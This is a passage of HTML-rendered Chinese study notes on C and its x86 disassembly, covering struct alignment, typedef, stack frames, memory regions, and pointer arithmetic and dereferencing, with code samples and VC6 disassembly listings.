class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub esp.18h</span><br><span class="line">mov ecx,6</span><br><span class="line">lea esi,[ebp-18h]</span><br><span class="line">mov edi,esp</span><br><span class="line">rep movsd</span><br></pre></td></tr></table></figure><h3 id="结构体对齐"><a href="#结构体对齐" class="headerlink" title="结构体对齐"></a>结构体对齐</h3><p>本质是：选择效率还是选择空间</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(n)</span></span><br><span class="line"><span class="comment">//结构体</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br></pre></td></tr></table></figure><p><strong>对齐参数：n为字节对齐数，其取值为1、2、4、8，vc6.0默认为8</strong></p><p>n和结构体成员的sizeof值（宽度）作比较，结构体成员的对齐数取两者的最小值。（主要看图吧，说不明白）</p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(n)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    __int64 b;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br></pre></td></tr></table></figure><p>如果n为1，也就是1字节对齐。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//13</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/nyUhvK1sYxErJ69.png" alt="image-20200909111214659.png"></p><p>2字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//14</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/I6dy48pPHFk3fCB.png" alt="image-20200909111400075.png"></p><p>4字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/iXgO7jUQ3Z9rNaW.png" alt="image-20200909111410178.png"></p><p>8字节对齐</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(Test));<span class="comment">//24</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/t2eMUwdouiyfaPv.png" alt="image-20200909111424322.png"></p><h3 id="对齐原则"><a href="#对齐原则" class="headerlink" title="对齐原则"></a>对齐原则</h3><ul><li>结构体的大小，是结构内部最大字节成员的整数倍，不足会补齐。（例如结构中最大的类型是int类型，结构体的大小就是4字节的整数倍。而不是8的整数倍），和上面的例子其实是一回事，默认参数为8。</li><li>有疑惑建议写代码，可以参考上述的例子</li><li>建议写代码时，由小到大的顺序进行书写，可以节省空间。</li></ul><h2 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h2><p>typedef作用是为一种数据类型定义一个新名字。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> BYTE;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> WORD;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> DWORD;</span><br></pre></td></tr></table></figure><p>对数组的操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> vector v[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vector v;<span class="comment">//相当于int v[10]</span></span><br><span class="line">    v[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    v[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>参数传递的时候，宽度默认为4</p><p><code>ebp-4(-8-c-10)</code>通常用来存储局部数据（类似于函数内的局部变量）</p><p><code>ebp+4</code>用来存储返回地址</p><p><code>ebp+8(+c+10)</code>通常用来存储参数</p><p><code>eax</code>通常用来存储函数的返回值</p><h2 id="字符串数组"><a href="#字符串数组" class="headerlink" title="字符串数组"></a>字符串数组</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> arr[<span class="number">10</span>];</span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">arr[<span class="number">2</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">arr[<span class="number">3</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">arr[<span class="number">4</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">arr[<span class="number">5</span>] = <span class="string">&#x27;\0&#x27;</span>;<span class="comment">//or 0 or null</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,arr);</span><br></pre></td></tr></table></figure><p>如果没有<code>\0</code>结果会出现垃圾数据，可以通过gb2312编码输出中文。</p><br><h1 id="0x07-C语言与内存"><a href="#0x07-C语言与内存" class="headerlink" title="0x07 C语言与内存"></a>0x07 C语言与内存</h1><p>一个程序在内存中执行的时候，会把程序分成几个区域。</p><h2 id="代码区"><a href="#代码区" class="headerlink" title="代码区"></a>代码区</h2><p>可读可写，用来存放代码。</p><h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><p>函数不调用时不分配堆栈。堆栈用来存放参数，局部变量，临时数据。</p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>动态申请的，大小是可变的。</p><p>可读可写。</p><h2 id="全局变量区"><a href="#全局变量区" class="headerlink" title="全局变量区"></a>全局变量区</h2><p>可读可写，存储全局变量。</p><h2 id="常量区"><a href="#常量区" class="headerlink" title="常量区"></a>常量区</h2><p>只读，存储常量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* x = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> y[] = <span class="string">&quot;china&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    *(x+<span class="number">1</span>) = <span class="string">&#x27;A&#x27;</span>;<span class="comment">//不能修改，因为*x存着&quot;china&quot;，china是字符常量。</span></span><br><span class="line">    x = <span class="string">&quot;aaa&quot;</span>;<span class="comment">//但是x的值可以修改。</span></span><br><span class="line">    y[<span class="number">1</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>y把china的值拷贝到了堆栈里，改的不是china，而是堆栈里的值。</p><p>x则是直接存储china的地址，所以无法修改。有疑惑可以看看反汇编。</p><hr><p><strong>全局变量的特点：</strong></p><ol><li><p>全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就会存在。启动后里面是否有值取决于声明是否给定了初始值，如果没有，默认为0。</p></li><li><p>全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值。</p></li><li><p>全局变量直到程序结束才会被释放</p></li><li><p>全局变量就是所谓的<strong>基址</strong></p></li><li><p><strong>全局变量的反汇编识别：如果看到一个直接的地址，那它就是全局变量。因为它早确定了不会改了。</strong></p></li></ol><p><strong>局部变量的特点：</strong></p><ol><li>局部变量在程序编译完成后并没有分配固定的地址</li><li>在所属的函数没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存。</li><li>当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据，局部变量消失。</li><li>局部变量只能在函数内部使用，函数A无法使用函数B的局部变量</li><li><strong>局部变量的反汇编识别：[ebp-4]， [ebp-8]，[ebp-0xc]。</strong>不同的编译器有可能会是[esp+]，通过栈顶找值。</li></ol><br><h1 id="0x08-指针-1"><a href="#0x08-指针-1" class="headerlink" title="0x08 指针 1"></a>0x08 指针 1</h1><h2 id="带-类型的宽度"><a href="#带-类型的宽度" class="headerlink" title="带*类型的宽度"></a>带*类型的宽度</h2><p><strong>任何数据类型加上*（不管是一个*还是多个*）都会变成新的类型，宽度为4字节(32位系统)</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SS</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* x;</span><br><span class="line">    <span class="keyword">short</span>**** y;</span><br><span class="line">    <span class="keyword">int</span>* z;</span><br><span class="line">    SS* b;</span><br><span class="line">    x = (<span class="keyword">char</span>*)<span class="number">1</span>;</span><br><span class="line">    y = (<span class="keyword">short</span>****)<span class="number">2</span>;</span><br><span class="line">    z = (<span class="keyword">int</span>*)<span class="number">3</span>;</span><br><span class="line">    b = (SS*)<span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="带-类型的-–"><a href="#带-类型的-–" class="headerlink" title="带*类型的++ –"></a>带*类型的++ –</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a;</span><br><span class="line">    <span class="keyword">short</span>* b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>*)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>*)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a++;</span><br><span class="line">    b++;</span><br><span class="line">    c++;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//101 102 104</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>去掉一个星号之后的宽度决定加几减几。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">short</span>*** b;</span><br><span class="line">    <span class="keyword">int</span>**** c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>***)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>****)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a++;</span><br><span class="line">    b++;</span><br><span class="line">    c++;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//32位系统104 104 104</span></span><br><span class="line">    <span class="comment">//64位系统108 108 108</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>char**去掉一个*宽度为4，short ***去掉一个*宽度也为4。</p><h2 id="带-类型的加减法"><a href="#带-类型的加减法" class="headerlink" title="带*类型的加减法"></a>带*类型的加减法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* a;</span><br><span class="line">    <span class="keyword">short</span>* b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>*)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>*)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a+=<span class="number">5</span>;</span><br><span class="line">    b+=<span class="number">5</span>;</span><br><span class="line">    c+=<span class="number">5</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//105 110 120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和前面一样，先去掉*看字节宽度，然后char+5就是5×1。short就是5×2。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">short</span>** b;</span><br><span class="line">    <span class="keyword">int</span>** c;</span><br><span class="line">    </span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    b = (<span class="keyword">short</span>**)<span class="number">100</span>;</span><br><span class="line">    c = (<span class="keyword">int</span>**)<span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    a+=<span class="number">5</span>;</span><br><span class="line">    b+=<span class="number">5</span>;</span><br><span class="line">    c+=<span class="number">5</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a,b,c);</span><br><span class="line">    <span class="comment">//120 120 120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理</p><p><strong>总结</strong></p><ul><li>带*类型的变量可以加、减一个整数，但是不能乘除。(编译器不允许)</li><li>带*类型变量与其他整数相加或相减的时候：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">带*类型变量 + N = 带*类型变量 + N*(去掉一个*后类型的宽度)</span><br><span class="line">带*类型变量 - N = 带*类型变量 - N*(去掉一个*后类型的宽度)</span><br></pre></td></tr></table></figure><h2 id="两个带-的类型相减"><a href="#两个带-的类型相减" class="headerlink" title="两个带*的类型相减"></a>两个带*的类型相减</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* a;</span><br><span class="line"><span class="keyword">char</span>* b;</span><br><span class="line">a = (<span class="keyword">char</span>*)<span class="number">200</span>;</span><br><span class="line">b = (<span class="keyword">char</span>*)<span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> x = a-b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);<span class="comment">//100</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">200</span>;</span><br><span class="line">    b = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> x = a-b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);<span class="comment">//25((200-100)/4)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>两个类型相同的带*类型的变量可以进行减法操作</li><li>想减的结果要除以去掉一个*的数据的宽度</li><li><strong>两个带*类型相减完的结果是int</strong></li></ol><h2 id="两个带-的类型作比较"><a href="#两个带-的类型作比较" class="headerlink" title="两个带*的类型作比较"></a>两个带*的类型作比较</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>** a;</span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    a = (<span class="keyword">char</span>**)<span class="number">200</span>;</span><br><span class="line">    b = (<span class="keyword">char</span>**)<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span>(a&gt;b)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure><p>带*的变量，如果类型相同，可以做大小的比较。</p><br><h1 id="0x09-指针-2"><a href="#0x09-指针-2" class="headerlink" title="0x09 指针 2"></a>0x09 指针 2</h1><h2 id="取地址符-amp"><a href="#取地址符-amp" class="headerlink" title="取地址符&amp;"></a>取地址符&amp;</h2><ul><li>&amp;可以取任何<strong>变量</strong>的地址</li><li>&amp;a的类型就是a的类型加上*</li><li>带*的类型用来存储地址</li></ul><p>局部变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>**** a;</span><br><span class="line">    <span class="keyword">short</span> b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    <span class="keyword">char</span>***** aa= &amp;a;</span><br><span class="line">    <span class="keyword">short</span>* bb = &amp;b;</span><br><span class="line">    <span class="keyword">int</span>** cc = &amp;c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1:        char**** a;</span><br><span class="line">2:        short b;</span><br><span class="line">3:        int* c;</span><br><span class="line">4:       char***** aa= &amp;a;</span><br><span class="line">00401028   lea         eax,[ebp-4]</span><br><span class="line">0040102B   mov         dword ptr [ebp-10h],eax</span><br><span class="line">5:       short* bb = &amp;b;</span><br><span class="line">0040102E   lea         ecx,[ebp-8]</span><br><span class="line">00401031   mov         dword ptr [ebp-14h],ecx</span><br><span class="line">6:       int** cc = &amp;c;</span><br><span class="line">00401034   lea         edx,[ebp-0Ch]</span><br><span class="line">00401037   mov         dword ptr [ebp-18h],edx</span><br></pre></td></tr></table></figure><p>全局变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>**** a;</span><br><span class="line"><span class="keyword">short</span> b;</span><br><span class="line"><span class="keyword">int</span>* c;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>***** aa= &amp;a;</span><br><span class="line">    <span class="keyword">short</span>* bb = &amp;b;</span><br><span class="line">    <span class="keyword">int</span>** cc = &amp;c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">9:        char***** aa= &amp;a;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],offset a (00427e3c)</span><br><span class="line">10:       short* bb = &amp;b;</span><br><span class="line">0040102F   mov         dword ptr [ebp-8],offset b (00427e38)</span><br><span class="line">11:       int** cc = &amp;c;</span><br><span class="line">00401036   mov         dword ptr [ebp-0Ch],offset c (00427e34)</span><br></pre></td></tr></table></figure><p>offset a的意思是指a的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea eax, [00427e3c]</span><br><span class="line">mov dword ptr [ebp-4],eax</span><br><span class="line">; 意思一样</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="*"></a>*</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* x;</span><br><span class="line"><span class="comment">//*x == int</span></span><br><span class="line"><span class="keyword">char</span>** y;</span><br><span class="line"><span class="comment">//*y == char*</span></span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">int</span>* b = &amp;a;</span><br><span class="line"><span class="keyword">int</span> c = *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00401028   mov         dword ptr [ebp-4],16h</span><br><span class="line">0040102F   lea         eax,[ebp-4]</span><br><span class="line">00401032   mov         dword ptr [ebp-8],eax</span><br><span class="line">00401035   mov         ecx,dword ptr [ebp-8]</span><br><span class="line">00401038   mov         edx,dword ptr [ecx]</span><br><span class="line">0040103A   mov         dword ptr [ebp-0Ch],edx</span><br></pre></td></tr></table></figure><p>编译器没有直接把地址存到ecx里，而是用ecx和edx进行过渡。</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="comment">//int* x = &amp;arr[0]可以简写成int* x = arr</span></span><br><span class="line">    <span class="keyword">int</span>* x = arr;</span><br><span class="line">    x+<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//x+1==地址+1×4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><em>int</em> x = &amp;arr[0]可以简写成int</em> x = arr**</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* a;</span><br><span class="line">    <span class="comment">//*(a+0) == a[0];</span></span><br><span class="line"><span class="comment">//*(a+2) == a[2];</span></span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    <span class="comment">//*(*(b+0)+0) == b[0][0];</span></span><br><span class="line">    <span class="comment">//*(*(b+2)+3) == b[2][3];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 